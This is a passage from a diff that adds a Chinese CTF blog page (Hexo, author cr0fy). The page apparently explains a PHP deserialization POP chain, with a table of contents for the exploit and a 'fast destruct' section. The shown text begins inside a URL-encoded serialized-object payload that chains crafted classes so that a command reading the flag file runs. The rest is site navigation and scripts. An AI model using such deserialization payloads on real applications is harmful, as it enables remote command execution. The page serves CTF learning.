class="number">27</span>cat+%<span class="number">2</span>Fflag%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>warn%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>Soeasy%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>type%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>whoareyou%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>Evil%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>Di%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">3</span>%<span class="number">3</span>A%<span class="number">22</span>cmd%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/.com//image-20220314222932459.png" alt="image-20220314222932459"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/25/ssti-%E5%85%A5%E9%97%A8/" rel="prev" title="ssti -入门">
+      <i class="fa fa-chevron-left"></i> ssti -入门
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E9%99%84%E4%B8%8A"><span class="nav-number">1.</span> <span class="nav-text">源码附上</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%90%E6%AD%A5%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">逐步分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E8%B7%B3%E6%9D%BF"><span class="nav-number">2.1.</span> <span class="nav-text">魔术跳板</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8Edestruct%E5%88%B0toString"><span class="nav-number">2.1.1.</span> <span class="nav-text">从destruct到toString</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E4%B8%80%E4%B8%8B%E8%A7%A6%E5%8F%91toString%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">提一下触发toString的条件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8EtoString%E5%88%B0call"><span class="nav-number">2.1.2.</span> <span class="nav-text">从toString到call</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90Soeasy%E7%B1%BB"><span class="nav-number">2.2.</span> <span class="nav-text">分析Soeasy类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="nav-number">3.</span> <span class="nav-text">完整EXP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fast-destruct"><span class="nav-number">4.</span> <span class="nav-text">fast destruct</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Payload"><span class="nav-number">5.</span> <span class="nav-text">Payload</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="cr0fy"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">cr0fy</p>
+  <div class="site-description" itemprop="description">学而后知</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cr0fy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cr0fy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://eli0t-g.github.io/" title="https:&#x2F;&#x2F;eli0t-g.github.io&#x2F;" rel="noopener" target="_blank">Krito</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://tsuppari404.github.io/" title="https:&#x2F;&#x2F;tsuppari404.github.io" rel="noopener" target="_blank">tsuppari</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://spacey.top/" title="https:&#x2F;&#x2F;spacey.top&#x2F;" rel="noopener" target="_blank">Eli0t</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://n0vice.gitee.io/" title="http:&#x2F;&#x2F;n0vice.gitee.io&#x2F;" rel="noopener" target="_blank">N0vice</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/pmrPMR" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;pmrPMR" rel="noopener" target="_blank">PMR</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/karsa" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;karsa" rel="noopener" target="_blank">karsa</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.darry-long.top/" title="http:&#x2F;&#x2F;www.darry-long.top&#x2F;" rel="noopener" target="_blank">darry</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cr0fy</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+  
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+
+  <script async src="/js/cursor/fireworks.js"></script>
+
+
+
+<script type="text/javascript">
+    var OriginTitile=document.title,st;
+	document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ你要玩捉迷藏嘛",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ好哦！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
